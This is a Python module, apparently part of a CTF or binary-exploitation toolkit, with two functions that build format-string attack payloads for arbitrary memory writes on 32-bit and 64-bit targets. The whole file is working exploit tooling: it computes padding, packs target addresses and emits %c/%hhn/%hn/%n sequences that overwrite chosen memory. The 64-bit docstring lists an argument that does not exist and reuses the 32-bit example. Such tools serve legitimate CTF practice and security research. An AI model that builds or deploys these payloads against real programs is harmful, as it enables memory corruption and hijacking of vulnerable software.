from ..util.log import get_logger
from .util import p32, p64

logger = get_logger()


def fsa_write_32(value: int, nth_stack: int, target_addr: int | None = None, offset: int = 0, each: int = 4) -> bytes:
    """Arbitrary write using format string bug (32bit)

    Args:
        value (int): The value to write.
        nth_stack (int): example
                    "AAAA%p %p %p..."
                    -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                    -> 7th (0x4141d402)
        target_addr (int): The address where the content will be written.
        offset (int, optional): From above example, offset is 2 (0x4141d402).
        each (int, optional): Write the value by each n bytes.
    Returns:
        bytes: The payload
    """
    assert each in (1, 2, 4)

    format_string = {
        1: "hhn",
        2: "hn",
        4: "n",
    }

    bit_len = 32
    byte_len = bit_len // 8

    # Adjust stack alignment
    payload = b"A" * (-offset % byte_len)
    if offset != 0:
        nth_stack += 1

    if target_addr:
        for i in range(0, byte_len, each):
            payload += p32(target_addr + i)

    previous_value = 0
    current_value = len(payload)
    for i in range(0, byte_len, each):
        previous_value = current_value
        current_value = value % (1 << 8 * each)
        offset = (current_value - previous_value) % (1 << 8 * each)
        payload += f"%{offset}c%{nth_stack}${format_string[each]}".encode()
        value >>= 8 * each
        nth_stack += 1

    return payload


def fsa_write_64(value: int, nth_stack: int, target_addr: int | None = None, offset: int = 0, each: int = 4) -> bytes:
    """Arbitrary write using format string bug (64bit)

    Args:
        target_addr (int): The address where the content will be written.
        value (int): The value to write.
        nth_stack (int): example
                    "AAAA%p %p %p..."
                    -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                    -> 7th (0x4141d402)
        offset (int, optional): From nth_stack's example, offset is 2 (0x4141d402).
        bits (int, optional): The bits of the target binary.
        each (int, optional): Write the value by each n bytes.
    Returns:
        bytes: The payload
    """
    assert each in (1, 2, 4)

    format_string = {
        1: "hhn",
        2: "hn",
        4: "n",
    }

    bit_len = 64
    byte_len = bit_len // 8

    value = value % (1 << 8 * each)
    assert value < 10**10 and nth_stack < 10**3
    tentative_payload = b"A" * (-offset % byte_len)
    tentative_payload += f"%{value:010}c%{nth_stack:03}${format_string[each]}".encode()
    tentative_payload += b"A" * (-len(tentative_payload) % byte_len)

    nth_stack += (len(tentative_payload) + byte_len - 1) // byte_len

    payload = b"A" * (-offset % byte_len)
    payload += f"%{value:010}c%{nth_stack:03}${format_string[each]}".encode()
    payload += b"A" * (-len(payload) % byte_len)
    if target_addr:
        payload += p64(target_addr)

    if b"\0" in payload.strip(b"\0"):
        logger.warning("The payload includes some null bytes.")

    return payload
